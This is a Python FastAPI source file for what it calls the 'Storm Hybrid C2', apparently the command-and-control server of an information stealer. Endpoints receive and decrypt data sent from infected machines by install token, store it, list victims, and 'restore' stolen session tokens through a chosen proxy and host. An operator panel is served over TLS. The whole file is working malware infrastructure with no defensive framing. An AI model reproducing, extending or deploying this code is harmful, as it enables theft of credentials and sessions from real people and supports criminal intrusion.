import json
import uuid
from pathlib import Path
from datetime import datetime, UTC

import uvicorn
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse

from decryptor import Decryptor
from receiver import Receiver
from session_restore import SessionRestore

app = FastAPI(title="Storm Hybrid C2")
decryptor = Decryptor()
receiver = Receiver()
session_restore = SessionRestore()

DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)


@app.get("/panel/", response_class=HTMLResponse)
async def panel():
    index = Path(__file__).parent / "panel" / "templates" / "index.html"
    if not index.exists():
        return HTMLResponse("<h1>Panel not found</h1>", status_code=404)
    return HTMLResponse(index.read_text(encoding="utf-8"))


@app.get("/api/health")
async def health():
    return {"status": "ok", "timestamp": datetime.now(UTC).isoformat()}


@app.post("/api/collect")
async def collect(request: Request):
    try:
        body = await request.json()
    except Exception:
        raise HTTPException(status_code=400, detail="invalid JSON")

    install_token = body.get("install_token") or request.headers.get("X-Install-Token", "unknown")
    system = body.get("system", {})
    aes_key = body.get("aes_key", "")
    encrypted = body.get("data", "")

    if aes_key:
        decryptor.register_key(install_token, aes_key)

    if body.get("encrypted"):
        data = decryptor.decrypt(encrypted, install_token)
    else:
        data = encrypted

    record = {
        "id": str(uuid.uuid4()),
        "install_token": install_token,
        "system": system,
        "timestamp": datetime.now(UTC).isoformat(),
        "data": data,
    }

    receiver.store(record)
    return {"status": "accepted", "id": record["id"]}


@app.post("/api/restore")
async def restore(request: Request):
    body = await request.json()
    token = body.get("token")
    proxy = body.get("proxy")
    host = body.get("host")
    result = session_restore.restore(token, proxy, host)
    return result


@app.get("/api/clients")
async def clients():
    return receiver.list_clients()


@app.get("/api/client/{install_token}")
async def client_detail(install_token: str):
    return receiver.get_client(install_token)


if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8443, ssl_keyfile="server.key", ssl_certfile="server.crt", log_level="info")
